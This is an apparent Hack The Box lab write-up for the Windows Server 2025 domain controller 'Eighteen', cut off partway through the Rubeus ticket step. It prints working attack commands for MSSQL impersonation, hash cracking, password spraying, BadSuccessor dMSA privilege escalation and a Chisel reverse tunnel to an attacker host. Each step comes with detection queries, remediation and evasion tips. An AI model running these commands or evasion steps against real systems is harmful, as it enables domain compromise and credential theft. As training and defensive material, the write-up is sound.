# Eighteen

**Platform:** Hack The Box  
**OS:** Windows Server 2025 (Build 26100)  
**Difficulty:** Easy  
**Tags:** Active Directory, MSSQL, dMSA, BadSuccessor, Kerberos, WinRM, Hash Cracking

---

## Summary

Eighteen is a Windows domain controller running IIS, MSSQL 2022, and WinRM. Initial access begins with provided MSSQL credentials for a low-privilege login. From there, a SQL-level impersonation chain leads to a restricted application developer context, which holds a database containing a PBKDF2-SHA256 password hash. Cracking that hash and spraying it across domain accounts discovered through RID brute-force yields WinRM access as `adam.scott`. Once on the box, a Windows Server 2025 specific privilege escalation path becomes available through the BadSuccessor attack, which abuses delegated Managed Service Accounts (dMSA), a feature introduced in Server 2025. The `adam.scott` account belongs to the `IT` group, which holds `CreateChild` rights over the `Staff` OU. Exploiting that allows creation of a dMSA configured to impersonate the domain Administrator. Extracting a usable service ticket requires tunneling the Kerberos port through Chisel due to Evil-WinRM restrictions, synchronising the attacker clock to compensate for a 7-hour skew against the DC, and chaining three Rubeus calls to produce a CIFS ticket for the domain controller. SMB access as a delegated Administrator yields the root flag.

---

## Methodology Notes

**What was new:** The dMSA BadSuccessor attack path is specific to Windows Server 2025. The feature was introduced in Server 2025 as a migration mechanism to replace legacy service accounts and was not present in earlier OS versions. Recognising the build number (`26100`) during enumeration and connecting it to a 2025-era attack surface was the key pivot. Without that context the OU `CreateChild` right would have looked like a dead end.

**Techniques used:** MSSQL impersonation via `EXECUTE AS LOGIN`, manual database enumeration without sqlmap, PBKDF2-SHA256 hash reformatting for hashcat, RID brute-force through MSSQL authentication, WinRM password spraying, AD ACL enumeration with native PowerShell cmdlets, BadSuccessor dMSA exploitation, reverse Chisel tunnel for Kerberos, multi-stage Rubeus ticket chain, and Kerberos-authenticated SMB.

**Mistakes and hard lessons:** The single most time-consuming problem on this machine was the DC clock skew. The domain controller ran approximately 7 hours ahead of the attacker machine and every Kerberos operation failed silently or with a misleading `KDC_Error: clock skew too great` until the attacker clock was manually shifted to match. The second significant blocker was Rubeus versioning: Rubeus must be v2.3.3 or later to support the `/dmsa` flag used in the dMSA ticket chain. Running an older build produces no useful error, it simply fails the request. Hours can disappear between those two issues. The Evil-WinRM session also blocks direct Rubeus execution of the `klist` action without the ticket being passed explicitly, which led to a detour through Chisel tunneling for both port 88 and port 445.

**Alternative approaches:** The hash could have been cracked offline without the werkzeug-to-hashcat reformatting step using tools that natively understand the Werkzeug PBKDF2 format, but reformatting to hashcat mode 10900 is faster and the conversion is mechanical. The RID brute-force was done through MSSQL/NTLM authentication rather than LDAP, which is worth noting as an approach when no domain user session is available yet.

**AI assistance:** Claude assisted with understanding the werkzeug hash format conversion and with diagnosing the clock skew error during the Kerberos phase. The attack chain itself was executed and verified manually.

---

## Step 1: Network Reconnaissance (T1046)

Three ports answer: 80 running Microsoft IIS 10.0, 1433 running SQL Server 2022 RTM, and 5985 running WinRM. The MSSQL NSE scripts resolve the machine as `DC01.eighteen.htb` inside domain `eighteen.htb` and report a build of `10.0.26100`, which maps to Windows Server 2025. This is not a detail to skip past. Windows Server 2025 introduced several new Active Directory mechanisms, and `26100` is the build number for the initial RTM release, meaning any Server 2025-specific vulnerabilities disclosed in 2025 are candidate attack surface here. The IIS site title `Welcome - eighteen.htb` confirms a virtual hostname requirement, so the host file needs entries for both `eighteen.htb` and `DC01.eighteen.htb`. The 7-hour clock skew reported by the NSE scanner against the DC is visible in the output at this stage and is an early warning that Kerberos operations will fail without clock correction later.

**Commands:**

```
nmap -p- --min-rate 3000 10.129.12.93
nmap -sV -sC -p 80,1433,5985 10.129.12.93
echo '10.129.12.93 eighteen.htb DC01.eighteen.htb' >> /etc/hosts
```

**Findings:** DC01 on Windows Server 2025 Build 26100. MSSQL 2022 RTM unpatched. Clock skew +7h00m against attacker machine. WinRM active on 5985.

**Blue Team Analysis:**

**Logs Generated:** Windows Security Event 4625 (failed auth attempts if any were made), IIS W3C access logs for port 80 HTTP requests. No MSSQL-specific Windows event logs are generated by unauthenticated port scans, but the MSSQL error log will record connection attempts that do not complete a TDS handshake.

**Alerts Triggered:** Host-based IDS tuned for port scanning will flag the `-p-` full range scan with a 3000 packet/second minimum rate. The timing is aggressive enough to trigger threshold-based network monitoring in most environments.

**Network Artifacts:** TCP SYN sweep across all 65535 ports originating from a single external IP. The rate is high enough to be visible in NetFlow records as an anomalous scan pattern.

**Disk / Memory Artifacts:** None from scanning alone.

**Sysmon / EDR Visibility:** No Sysmon events from network scanning. EDR network telemetry will capture the connection attempts if the agent has packet inspection capability.

**SIEM Correlation (Splunk SPL):**
```
index=network sourcetype=zeek:conn dest_port=1433 OR dest_port=5985 OR dest_port=80
| stats count by src_ip dest_ip dest_port
| where count > 100
```

**Sigma Rules:** [Port Scan Detection](https://github.com/SigmaHQ/sigma/search?q=port+scan): broad network scan pattern against multiple ports from a single source in a short window.

**Bypass Guidance:** Rate limiting the scan defeats threshold-based detection but does not defeat stateful port scan detection that fires on any ordered full-range sweep regardless of timing. Targeting specific ports with prior knowledge removes the need for a full scan.

**Remediation:** MSSQL 1433 and WinRM 5985 should not be reachable from untrusted external networks. Firewall rules should restrict access to administrative ports to management subnets only.

**OpSec Rating:** Loud. A full -p- scan at 3000 PPS against a production host will be caught by any network monitoring infrastructure.

---

## Step 2: MSSQL Authentication and SQL-Level Impersonation (T1078.001, T1134.001)

Credentials `kevin:iNa2we6haRj2gaw!` are provided with the machine or discovered through the web application. Connecting with `impacket-mssqlclient` establishes a SQL Server session where `SYSTEM_USER` returns `KEVIN` and `USER_NAME()` returns `guest`, confirming that `kevin` is a SQL login but has minimal database-level privileges. Enumerating impersonation permissions shows that `kevin` has been granted `IMPERSONATE` on the `appdev` login. This is a SQL Server feature that allows one principal to assume the security context of another for the duration of a session, and it is frequently misconfigured in environments where developers are granted broad access to service accounts. Switching to the `appdev` context with `exec_as_login appdev` elevates the session to that login's privilege set without requiring `appdev`'s password.

The `msdb` database is marked `is_trustworthy_on = 1`, which is noted for reference. Trustworthy enables cross-database ownership chaining and can be used in server-level privilege escalation chains in some configurations, but it was not required here.

**Commands:**

```
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.12.93
```

Within the mssqlclient session:

```
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT USER_NAME();
enum_db
enum_logins
enum_impersonate
exec_as_login appdev
```

**Findings:** kevin → appdev impersonation granted. appdev has access to `financial_planner` database. msdb is trustworthy.

**Blue Team Analysis:**

**Logs Generated:** SQL Server audit log (if configured) records the `EXECUTE AS LOGIN` event under event class 15 (SQL Statement Completed) or SQL Server Audit login events if C2 auditing or extended events are active. Windows Security 4624 was already generated on kevin's initial TCP authentication.

**Alerts Triggered:** Environments with SQL Server auditing configured to monitor impersonation calls will alert on `EXECUTE AS LOGIN` with a target differing from the originating principal. Most SQL Server deployments do not have this level of auditing by default.

**Network Artifacts:** TDS protocol traffic on port 1433. The authentication handshake is NTLM-based by default for SQL logins against a domain-joined server. NTLM challenge-response is visible in plaintext on unencrypted TDS connections; SQL Server 2022 defaults to opportunistic encryption but the fallback cert here is self-signed.

**Disk / Memory Artifacts:** SQL Server error log records login events. The `exec_as_login` call appears in `sys.dm_exec_sessions` while the session is active and in the default trace ring buffer for a short window.

**Sysmon / EDR Visibility:** No Sysmon events directly. EDR agents monitoring SQL Server process memory may detect the security context switch if they hook into the SQL Server process.

**SIEM Correlation (Splunk SPL):**
```
index=mssql sourcetype=mssql:audit EventClass=15
| search Statement="*EXECUTE AS LOGIN*"
| table _time LoginName TargetLoginName HostName
```

**Sigma Rules:** [MSSQL Impersonation](https://github.com/SigmaHQ/sigma/search?q=mssql+impersonation): flags `EXECUTE AS LOGIN` statements in SQL audit logs where the caller and target principal differ.

**Bypass Guidance:** The `exec_as_login` call generates a recognisable audit event that is difficult to obfuscate while still using the feature. Staying within kevin's existing permissions avoids the impersonation log entry but limits access.

**Remediation:** Revoke `IMPERSONATE` grants on privileged logins from any low-privilege user. Audit `sys.database_permissions` for type `IM` grants regularly. Enable SQL Server auditing with at minimum the `DATABASE_OBJECT_PERMISSION_CHANGE_GROUP` and `SERVER_PERMISSION_CHANGE_GROUP` action groups.

**OpSec Rating:** Moderate. The impersonation event is auditable but requires explicit SQL Server audit configuration that many organisations do not deploy.

---

## Step 3: Database Enumeration and Hash Extraction (T1213, T1555)

With the `appdev` context active, the `financial_planner` database is accessible. Enumerating tables under `dbo` and querying column metadata on the `users` table reveals `username`, `email`, and `password_hash` columns. Selecting all rows returns a single admin account with a Werkzeug PBKDF2-SHA256 hash in the format `pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`. This is the standard output of Python's Werkzeug `generate_password_hash()` function with 600,000 rounds of PBKDF2-SHA256, meaning the application backing this database is likely a Flask or Werkzeug-based web app.

Hashcat mode 10900 handles PBKDF2-SHA256 but expects a specific format: `sha256:<iterations>:<base64_salt>:<base64_hash>`. The Werkzeug format stores the salt as raw ASCII and the derived key as lowercase hex, so both must be converted. The salt is base64-encoded as-is, and the hex-encoded derived key is decoded to raw bytes and then base64-encoded. The `printf` and `xxd` pipeline handles this on the command line without needing a separate Python script.

**Commands:**

Within the mssqlclient session:

```
use financial_planner
select name from sys.tables
select column_name, data_type from information_schema.columns where table_name = 'users'
select username, email, password_hash FROM financial_planner.dbo.users;
```

Hash reformatting on the attacker machine:

```
printf "sha256:600000:%s:%s\n" "$(echo -n 'AMtzteQIG7yAbZIa' | base64 -w 0)" "$(echo -n '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | xxd -r -p | base64 -w 0)"
```

```
hashcat -m 10900 'sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' -a 0 /usr/share/wordlists/rockyou.txt -w 3 -O
```

**Findings:** admin@eighteen.htb uses password `iloveyou1`. Hash cracked in rockyou run.

**Blue Team Analysis:**

**Logs Generated:** SQL Server audit log records the `SELECT` against `financial_planner.dbo.users` if table-level auditing is configured. The `SELECT` itself leaves no Windows event trail.

**Alerts Triggered:** Data Loss Prevention tools watching SQL query patterns for `SELECT *` against tables named `users`, `passwords`, or `credentials` may alert. DLP rules on the network layer could flag large result sets exiting the MSSQL port if the table were large, but a single-row result is unlikely to trigger volume thresholds.

**Network Artifacts:** The hash value transits the network in the TDS response payload. If TLS is not enforced end-to-end on the MSSQL connection, the hash is recoverable from network captures.

**Disk / Memory Artifacts:** The hash appears in SQL Server plan cache and potentially in buffer pool pages while the query result is cached. Extended event sessions capturing `sql_statement_completed` events will record the query text.

**Sysmon / EDR Visibility:** None for the query itself. If the hash is written to disk on the attacker machine, file creation events may be logged on the attacker endpoint.

**SIEM Correlation (Splunk SPL):**
```
index=mssql sourcetype=mssql:audit ObjectName=users ActionID=SL
| table _time LoginName DatabaseName Statement
```

**Sigma Rules:** [Sensitive Table Access via MSSQL](https://github.com/SigmaHQ/sigma/search?q=mssql+credential+access): monitors SELECT statements against tables containing credential-related column names in SQL audit logs.

**Bypass Guidance:** Row-level security policies on the `users` table would limit which rows the `appdev` context could read. Column-level encryption (Always Encrypted) would prevent the plaintext hash from being returned to the client even with `SELECT` privileges, rendering this extraction useless.

**Remediation:** Apply least-privilege to the `appdev` SQL login. It should have no `SELECT` on the `users` table. Enforce TLS on all MSSQL connections. Enable Extended Events or SQL Audit at the table level for any table storing credential material.

**OpSec Rating:** Low. A single SELECT against a users table is indistinguishable from normal application traffic without explicit audit rules targeting credential-bearing tables.

---

## Step 4: Domain Enumeration via MSSQL RID Brute-Force (T1087.002)

Before attempting to use the cracked credential, the domain user list needs to be established. The MSSQL connection authenticates over NTLM against the domain controller, which means the authenticated context can be used to query RIDs via the SMB/RPC path that `netexec` exploits with `--rid-brute`. This enumerates domain accounts without requiring a domain login or LDAP access, making it viable at the point where only a SQL login is available. The brute-force resolves twelve domain accounts and several groups across the RID range 1600-1612, including seven standard user accounts: `jamie.dunn`, `jane.smith`, `alice.jones`, `adam.scott`, `bob.brown`, `carol.white`, and `dave.green`.

**Commands:**

```
nxc mssql 10.129.12.93 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

**Findings:** Seven domain user accounts discovered. Service account `mssqlsvc` visible at RID 1601. Groups `HR`, `IT`, `Finance` present in `Staff` OU context.

**Blue Team Analysis:**

**Logs Generated:** Windows Security 4776 (NTLM authentication) for each RID lookup cycle. Depending on the volume and speed of the brute-force, Security 4625 may appear for any RIDs that resolve to disabled or nonexistent accounts with unexpected name formats.

**Alerts Triggered:** Environments monitoring for repetitive NTLM authentications from a single source in a short window will detect the RID brute pattern. The `--local-auth` flag targets the local machine account rather than the domain, which may lower the visibility in domain-level SIEM rules tuned for domain authentication failures.

**Network Artifacts:** SMB traffic on port 445 from the attacker IP to the DC. LSA policy lookups over the SMB named pipe `\PIPE\lsarpc` are the transport for SID/RID translation.

**Disk / Memory Artifacts:** Windows Security event log entries. LSA cache updated with translated SIDs during the enumeration.

**Sysmon / EDR Visibility:** Sysmon Event ID 3 (Network Connection) for SMB connections on 445. EDR may correlate repeated SMB pipe connections with policy handle opens against `lsarpc`.

**SIEM Correlation (Splunk SPL):**
```
index=wineventlog EventCode=4776 Workstation_Name!="" 
| stats count by src_ip Workstation_Name
| where count > 50
```

**Sigma Rules:** [RID Hijacking / Enumeration](https://github.com/SigmaHQ/sigma/search?q=rid+enumeration+lsa): correlates bulk LSA SID lookup requests over SMB from a single source.

**Bypass Guidance:** Slowing the request rate reduces the likelihood of count-based threshold alerts. Using a domain session for LDAP enumeration instead of MSSQL-based RID brute is less anomalous but requires a domain credential first.

**Remediation:** Restrict access to `\PIPE\lsarpc` by non-administrative accounts via Group Policy. Enable LDAP signing and channel binding to reduce the value of NTLM-based enumeration paths.

**OpSec Rating:** Moderate. Rapid RID enumeration over SMB is anomalous but requires SIEM rules specifically watching for LSA bulk lookups to catch.

---

## Step 5: WinRM Credential Spraying and Foothold (T1110.003, T1021.006)

With seven domain usernames and two recovered passwords (`iNa2we6haRj2gaw!` from the initial kevin credential and `iloveyou1` from the cracked hash), a spray across WinRM using both passwords identifies `adam.scott:iloveyou1` as valid with `Pwn3d!` confirmation. No other combinations succeed. The password `iloveyou1` is the application admin password stored in the financial planner database, and its reuse across a domain account is the vulnerability that converts an MSSQL foothold into a domain shell.

**Commands:**

```
netexec winrm 10.129.12.93 -u 18users.txt -p 18pwd.txt --continue-on-success 2>/dev/null
```

```
evil-winrm -i 10.129.12.93 -u adam.scott -p 'iloveyou1'
```

**Findings:** adam.scott:iloveyou1 authenticates to WinRM. User flag at `C:\Users\adam.scott\Desktop\user.txt`: `f86b4f1e306e1f5db4f87cdcc506d0b3`.

**Blue Team Analysis:**

**Logs Generated:** Windows Security 4624 (logon type 3, network) for each successful authentication. Security 4625 for all failed attempts. WinRM generates additional events under the Microsoft-Windows-WinRM/Operational log: Event 91 (session creation) and Event 169 (authentication success).

**Alerts Triggered:** A sequential spray of 14 authentication attempts (7 users × 2 passwords) in a short window is a textbook spray pattern. SIEM rules tuned for multiple 4625 events from the same source IP within a sliding window will fire. However, `--continue-on-success` stops spraying after the first hit, which slightly reduces the total failure count visible in logs.

**Network Artifacts:** HTTP POST requests to port 5985 with WSMan/1.0 user-agent in the body. The authentication method is Kerberos or NTLM depending on whether the attacker's machine is domain-joined; against a standalone WinRM endpoint, NTLM is the default.

**Disk / Memory Artifacts:** Windows Event Log entries as described. The WinRM session spawns a `wsmprovhost.exe` process under the authenticated user's context, visible in process listings.

**Sysmon / EDR Visibility:** Sysmon Event ID 1 (Process Create) for `wsmprovhost.exe` with parent `svchost.exe`. Event ID 3 for inbound port 5985 network connections. EDR will flag Evil-WinRM's PowerShell invocations inside the session.

**SIEM Correlation (Splunk SPL):**
```
index=wineventlog EventCode=4625 LogonType=3
| bin _time span=5m
| stats count dc(TargetUserName) as unique_users by src_ip _time
| where count > 5 AND unique_users > 3
```

**Sigma Rules:** [WinRM Access](https://github.com/SigmaHQ/sigma/search?q=winrm+remote+management): detects inbound WinRM connections establishing PowerShell remoting sessions from unexpected source hosts.

**Bypass Guidance:** Spraying with a longer delay between attempts (one attempt per 30 minutes per user) evades count-based threshold rules but risks being caught by behaviour analytics that flag credential failures against multiple accounts from a single source. Using Kerberos pre-authentication instead of NTLM for the WinRM session removes the NTLM challenge-response from network captures.

**Remediation:** Enforce MFA for all remote management interfaces. Disable WinRM for accounts that do not require remote shell access via Group Policy (Computer Configuration → Administrative Templates → Windows Remote Management). Implement account lockout policy with a threshold of 5 invalid attempts.

**OpSec Rating:** Moderate to loud depending on SOC maturity. The 14-attempt sequence will produce 13 failure events before the success, which is within common detection thresholds.

---

## Step 6: Active Directory Enumeration and ACL Discovery (T1069.002, T1087.002)

After landing on the DC as `adam.scott`, standard AD enumeration begins with privilege context, group membership, and OU structure. `whoami /all` shows no elevated privileges beyond `SeMachineAccountPrivilege` and standard user rights. The domain functional level is `Windows2025Domain`, confirming Server 2025 AD features are active. Two OUs exist: `Domain Controllers` and `Staff`. Examining the ACL on the `Staff` OU with `Get-Acl` over the AD provider reveals that the `EIGHTEEN\IT` group holds a `CreateChild` right scoped to all object types on that OU. Checking group membership confirms `adam.scott` is a member of `IT`. A low-privilege user with `CreateChild` on any OU in a Windows Server 2025 domain is the prerequisite for the BadSuccessor dMSA attack.

**Commands:**

```
whoami /all
hostname
Get-ADDomain | Select Forest, DomainMode, PDCEmulator
Get-ADOrganizationalUnit -Filter * | Select Name, DistinguishedName
Get-Acl -Path "AD:OU=Staff,DC=eighteen,DC=htb" | Select -Expand Access | Format-List
Get-ADGroupMember -Identity "IT" | Where-Object {$_.SamAccountName -eq "adam.scott"}
```

**Findings:** adam.scott is in IT group. IT has `CreateChild` on `OU=Staff`. Domain functional level is Windows2025Domain. No local privileges of use.

**Blue Team Analysis:**

**Logs Generated:** Active Directory Security event 4662 (`Object Operation`) fires when the ACL of an AD object is read if SACL auditing is configured on that object. By default, OUs do not have SACLs enabled, so `Get-Acl` over AD: typically generates no security event. Security 4661 may appear if handle auditing is configured at a broad level.

**Alerts Triggered:** Without SACL configuration on the `Staff` OU, this enumeration is invisible to the Windows event log. Advanced identity platforms (CrowdStrike Identity Protection, Microsoft Defender for Identity) perform behavioural analysis on LDAP query patterns and may flag an account performing unusual ACL reads shortly after initial logon.

**Network Artifacts:** LDAP queries on port 389 or 636 to the DC originating from the DC's own loopback or from the WinRM session's network context.

**Disk / Memory Artifacts:** None.

**Sysmon / EDR Visibility:** Sysmon Event ID 18 (Pipe Connected) or Event ID 3 may appear for LDAP connections initiated from within the Evil-WinRM session, depending on configuration.

**SIEM Correlation (Splunk SPL):**
```
index=wineventlog EventCode=4662 ObjectType="organizationalUnit"
| table _time SubjectUserName ObjectName Properties
```

**Sigma Rules:** [Active Directory Enumeration](https://github.com/SigmaHQ/sigma/search?q=active+directory+acl+enumeration): correlates LDAP attribute reads on security descriptor properties against AD objects shortly after a new logon event.

**Bypass Guidance:** LDAP-based ACL enumeration is difficult to obscure without avoiding it entirely. BloodHound's collection is noisier due to volume; the native PowerShell approach used here generates fewer LDAP operations and blends more naturally with administrative activity.

**Remediation:** Enable SACL-based auditing on all OUs containing privileged or sensitive objects. Regularly audit and review delegated permissions across OUs using tooling that surfaces non-default ACEs. The IT group holding `CreateChild` on `Staff` is an excessive delegation that serves no documented operational purpose.

**OpSec Rating:** Low with default AD configuration. Without SACL auditing on the OU, this enumeration leaves no event log trace.

---

## Step 7: BadSuccessor dMSA Privilege Escalation (T1134.001, T1136.001)

The BadSuccessor attack exploits a design property of delegated Managed Service Accounts (dMSA), introduced in Windows Server 2025 as a mechanism for migrating away from traditional service accounts. When a dMSA is created, it can be configured with a `msDS-DelegatedAdmins` attribute pointing to a principal (in this case `adam.scott`) and a `msDS-SupersededAccount` attribute pointing to a target account (in this case `Administrator`). The domain controller interprets these attributes during Kerberos authentication and includes the superseded account's privileges in the tickets issued for the dMSA. An attacker with `CreateChild` on any OU can create the dMSA, configure these attributes without additional write permissions, and then have any principal in `msDS-DelegatedAdmins` request tickets on behalf of the dMSA that carry the full privilege set of the superseded Administrator account.

The `BadSuccessor.ps1` script from the Akamai research handles the creation and attribute configuration in a single call. The resulting `xmp` object in the `Staff` OU has class `msDS-DelegatedManagedServiceAccount`, confirming correct creation.

**Commands:**

```
upload /home/kali/Downloads/Machines/Easy/Eighteen/BadSuccessor.ps1 BadSuccessor.ps1
Import-Module .\BadSuccessor.ps1
BadSuccessor -Mode Exploit -Domain "eighteen.htb" -Path "OU=Staff,DC=eighteen,DC=htb" -Name "xmp" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator"
Get-ADObject -Filter * -SearchBase "OU=Staff,DC=eighteen,DC=htb" | Select Name,ObjectClass
```

**Findings:** dMSA `xmp` created in `OU=Staff`. Class `msDS-DelegatedManagedServiceAccount` confirmed. Output states `adam.scott can now impersonate Administrator`.

**Blue Team Analysis:**

**Logs Generated:** Active Directory Security event 5137 (`Directory Service Object Created`) records the creation of the dMSA object. Security event 5136 (`Directory Service Object Modified`) logs each attribute write: `msDS-DelegatedAdmins`, `msDS-SupersededAccount`, and the `msDS-ManagedPasswordInterval` or related attributes set by the script. Event 4662 may appear for the attribute write operations if SACL auditing is configured on the parent OU.

**Alerts Triggered:** Microsoft Defender for Identity (MDI) has detections specifically for dMSA-based attacks in its 2025 ruleset following the Akamai disclosure. MDI will flag the creation of a dMSA by a non-administrative account and the configuration of `msDS-SupersededAccount` pointing to a privileged account. SIEM rules watching for new AD object creation under user OUs will catch the 5137 event.

**Network Artifacts:** LDAP AddRequest followed by multiple ModifyRequest operations to the DC on port 389. All operations are authenticated under `adam.scott`'s session context.

**Disk / Memory Artifacts:** The dMSA object persists in the AD database (NTDS.dit) until manually deleted. The `BadSuccessor.ps1` script is written to disk in the Evil-WinRM session working directory and may persist in PowerShell script block logs.

**Sysmon / EDR Visibility:** Sysmon Event ID 1 for `powershell.exe` spawning within the WinRM session. Script Block Logging (Event 4104) will capture the `Import-Module` and `BadSuccessor` invocations if PowerShell logging is configured. The module performs LDAP operations rather than WinAPI calls, so no memory injection events are expected.

**SIEM Correlation (Splunk SPL):**
```
index=wineventlog EventCode=5137 ObjectClass=msDS-DelegatedManagedServiceAccount
| table _time SubjectUserName ObjectDN
```

**Sigma Rules:** [Delegated MSA Creation](https://github.com/SigmaHQ/sigma/search?q=dmsa+delegated+managed+service+account): detects creation of objects of class `msDS-DelegatedManagedServiceAccount` by accounts that are not members of Domain Admins or designated service account management groups.

**Bypass Guidance:** There is no operational bypass for this detection if MDI or a SIEM rule specifically watches for dMSA object creation by non-privileged accounts. The 5137 event is generated at the domain controller regardless of how the object is created. The only way to reduce detection surface is to use an account that would be expected to create objects in the target OU, which would require escalating privileges first through an alternative path.

**Remediation:** Apply the Microsoft patch for CVE-2025-29810 (or the applicable Windows Server 2025 security update addressing dMSA privilege escalation). Until patched, restrict `CreateChild` rights on all OUs to explicitly named administrative accounts and remove delegated group permissions. Audit `msDS-DelegatedAdmins` and `msDS-SupersededAccount` attributes across all existing dMSA objects. Enable MDI and configure alerts for dMSA creation events.

**OpSec Rating:** Detected in patched environments with MDI. Moderate noise even without MDI due to the 5137 event being visible in any SIEM with AD object auditing configured.

---

## Step 8: Chisel Reverse Tunnel for Kerberos Port 88 and SMB 445 (T1572)

Direct Kerberos operations from the attacker machine against the DC require TCP port 88, which is not exposed externally. The Evil-WinRM session does not allow direct Rubeus `klist` operations or arbitrary Kerberos tooling in a way that allows ticket export to the attacker machine cleanly. The solution is a Chisel reverse tunnel: the attacker runs a Chisel server with `--reverse` and the Windows client connects out from the DC session, forwarding port 88 (Kerberos) and port 445 (SMB) to the attacker's localhost. This makes Kerberos operations executable from the attacker machine using impacket or local tools as if the DC's KDC were locally accessible.

The Chisel client binary is uploaded to the DC via Evil-WinRM. A 64-bit Windows binary (`c64.exe`) matching the server's Chisel version is required. Version mismatch between client and server produces a warning but still functions; `1.11.5` client against `1.11.5-0kali1` server connected successfully here.

**Commands:**

On the attacker machine:

```
chisel server -p 9001 --reverse --socks5
```

In the Evil-WinRM session:

```
upload /home/kali/Downloads/Machines/Easy/Eighteen/c64.exe c64.exe
.\c64.exe client 10.10.16.145:9001 R:9002:127.0.0.1:88
.\c64.exe client 10.10.16.145:9001 R:9003:127.0.0.1:445
```

Verification on attacker machine:

```
ss -tlnp | grep 900
```

**Findings:** Port 9002 on attacker maps to DC's Kerberos port 88. Port 9003 on attacker maps to DC's SMB port 445. Tunnel latency approximately 69ms.

**Blue Team Analysis:**

**Logs Generated:** Windows Filtering Platform connection events if the firewall is logging outbound connections. The outbound connection from the DC to the attacker's Chisel server on port 9001 would appear in Security event 5156 (network connection permitted). The `c64.exe` write to disk generates a file creation event.

**Alerts Triggered:** A DC initiating outbound WebSocket connections (Chisel uses HTTP upgrade to WebSocket over the control channel) to an external IP on a non-standard port is anomalous. Egress filtering rules that restrict DC outbound internet access would block this entirely.

**Network Artifacts:** Outbound WebSocket connection from the DC to attacker:9001. Subsequent TCP streams for each forwarded tunnel appearing as connections from attacker's local ports 9002 and 9003 toward the DC.

**Disk / Memory Artifacts:** `c64.exe` written to the working directory of the Evil-WinRM session (typically `C:\Users\adam.scott\Documents`). Sysmon will log the file creation and the process creation.

**Sysmon / EDR Visibility:** Sysmon Event ID 1 (Process Create) for `c64.exe`. Event ID 3 (Network Connection) for the outbound WebSocket. EDR will likely flag an unsigned executable establishing an outbound tunnel from a domain controller, which is highly anomalous.

**SIEM Correlation (Splunk SPL):**
```
index=wineventlog EventCode=5156 Direction=Outbound dest_port!=80 dest_port!=443 dest_port!=53
| where host="DC01"
| table _time dest_ip dest_port Application
```

**Sigma Rules:** [Chisel Tunneling Tool](https://github.com/SigmaHQ/sigma/search?q=chisel+tunnel): detects process creation events matching Chisel binary names or command-line patterns including `client` and `R:` reverse tunnel arguments.

**Bypass Guidance:** Tunneling over port 443 instead of 9001 blends with HTTPS egress. Renaming the binary evades name-based detection but not behavioural heuristics on WebSocket upgrade patterns from server processes. If egress from the DC to the internet is blocked at the firewall, this approach fails entirely and a pivot through an internal compromised host would be required.

**Remediation:** Block all outbound internet access from domain controllers at the network firewall. DCs should communicate only with defined internal subnets and upstream DNS servers. Implement application allowlisting on DCs to prevent execution of unknown binaries.

**OpSec Rating:** Loud on any hardened DC. Egress filtering alone would have stopped this step entirely.

---

## Step 9: Clock Synchronisation (Environmental Prerequisite)

All Kerberos operations failed with `KDC_Error: clock skew too great` until the attacker machine's clock was manually advanced to match the DC. The nmap output had reported a +7h00m clock skew from the outset. Kerberos enforces a maximum 5-minute clock skew between client and KDC, and any authentication attempt outside that window is rejected. On a real engagement this would be handled by configuring NTP to sync to the target domain or by using `faketime` to wrap individual commands. On HTB, advancing the attacker system clock is the direct solution.

**Commands:**

```
sudo date -s "$(date --date='+6 hours +59 minutes +59 seconds')"
```

**Findings:** After clock adjustment, Kerberos TGT requests succeed. The adjustment needs to be applied before each Rubeus command series if the session has run long enough for drift to accumulate.

**OpSec Rating:** Not applicable: this is an attacker-side configuration issue, not a technique with a detection surface on the target.

---

## Step 10: Rubeus Kerberos Ticket Chain (T1558.001, T1550.003)

Acquiring a usable service ticket via the dMSA requires three sequential Rubeus operations. First, a TGT for `adam.scott` is obtained from the KDC through the Chisel tunnel on port 9002 using the plaintext credential. Second, that TGT is used to request a Kerberos ticket for the dMSA `xmp$` against the `krbtgt` service with the `/dmsa` flag, which instructs Rubeus to perform the dMSA-specific exchange that causes the KDC to include Administrator's PAC data in the resulting ticket. Third, the dMSA ticket is used to request a final CIFS service ticket for `DC01.eighteen.htb`, which is what SMB authentication requires.

The `/dmsa` flag was introduced in Rubeus v2.3.3. Running any earlier version silently produces a ticket that does not include the superseded account's privileges. This is a version-sensitive dependency that cost significant time during the solve.

Tickets are produced in kirbi format with `/nowrap` and `/outfile` so they can be downloaded and converted for impacket use.

**Commands:**

In the Evil-WinRM session:

```
upload /home/kali/Downloads/Machines/Easy/Eighteen/Rubeus.exe Rubeus.exe
.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /enctype:aes256 /nowrap /outfile:tgt.kirbi
.\Rubeus.exe asktgs /targetuser:xmp$ /service:krbtgt/eighteen.htb /dmsa /opsec /nowrap /outfile:xmp_tgt.kirbi /ticket:<base64_tgt_from_previous>
.\Rubeus.exe asktgs /service:cifs/dc01.eighteen.htb /nowrap /outfile:xmp_cifs.kirbi /ticket:<base64_xmp_tgt_from_previous>
download xmp_cifs.kirbi
```

On the attacker machine:

```
impacket-ticketConverter xmp_cifs.kirbi xmp_cifs.ccache
export KRB5CCNAME=$(pwd)/xmp_cifs.ccache
klist
```

**Findings:** CIFS ticket for `dc01.eighteen.htb` issued under `xmp$@EIGHTEEN.HTB` with Administrator-level PAC. `klist` confirms ticket validity.

**Blue Team Analysis:**

**Logs Generated:** Windows Security 4768 (TGT request) on the DC for `adam.scott`. Security 4769 (TGS request) for `krbtgt/eighteen.htb` targeting `xmp$`. A second 4769 for `cifs/dc01.eighteen.htb`. If MDI is deployed and updated to detect BadSuccessor, the dMSA-specific TGS request to `krbtgt` will generate an MDI alert at this step.

**Alerts Triggered:** The TGS request with `/dmsa` produces a non-standard Kerberos exchange that involves requesting a `krbtgt` service ticket (unusual in normal operations), which may trigger anomaly-based detection in MDI or Sentinel analytics rules watching for unusual service principal patterns. The elevated PAC in the resulting ticket is detectable if ticket inspection is configured.

